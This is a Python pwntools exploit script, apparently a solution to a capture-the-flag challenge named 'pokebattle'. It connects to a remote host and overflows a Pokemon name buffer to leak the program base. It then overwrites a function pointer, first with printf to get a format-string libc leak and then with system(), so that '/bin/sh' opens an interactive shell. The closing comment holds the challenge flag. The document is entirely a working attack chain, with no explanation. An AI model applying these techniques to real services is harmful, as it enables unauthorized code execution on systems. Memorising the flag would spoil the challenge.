import time

from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def fight():
    io.recvuntil(b'> ')
    io.sendline(b'1')

    data = io.recvuntil(b"It's very effective")
    return data[:-len(b"It's very effective")]


@debug
def poke_ball(idx, name):
    io.recvuntil(b'> ')
    io.sendline(b'2')

    io.recvuntil(b'slot : \n')
    io.sendline(b'%d' % idx)

    io.recvuntil(b'name : \n')
    io.send(name)


@debug
def pokemons(idx):
    io.recvuntil(b'> ')
    io.sendline(b'4')

    io.recvuntil(b'0 . ')
    name = io.recvuntil(b'/')[:-1]

    io.recvuntil(b'Select Pokemon : \n')
    io.sendline(b'%d' % idx)
    io.recvuntil(b'!\n')
    return name


binpath = './pokebattle'
elf = ELF(binpath)
libc = ELF('./libc.so.6')


context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
b *(0xC17+0x555555554000)
b *(0xA55+0x555555554000)
set $my_pokemons=0x204040+0x555555554000
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('114.177.250.4', 2225)

payload = b'A' * 0x27 + b'\n'
poke_ball(0, payload)

data = pokemons(0)[0x28:-1]
addr_prog = u64(data.ljust(8, b'\x00')) - 0x92a
print("addr_prog = 0x{:x}".format(addr_prog))

payload = b'%19$p'
payload += b'B' * (0x28 - len(payload))
payload += p64(addr_prog + elf.plt['printf'])
payload += b'\n'
poke_ball(0, payload)

data = fight()
addr_libc = int(data[:data.find(b'B')], 16) - 0x1b3787
print("addr_libc = 0x{:x}".format(addr_libc))


payload = b'C' * 0x28
payload += p64(addr_libc + libc.symbols['system'])
payload += b'\n'
poke_ball(0, payload)

payload = b'/bin/sh\x00\n'
poke_ball(0, payload)

io.recvuntil(b'> ')
io.sendline(b'1')


io.interactive()


# ctrctf{m394_1nd3x_m0nst3r}
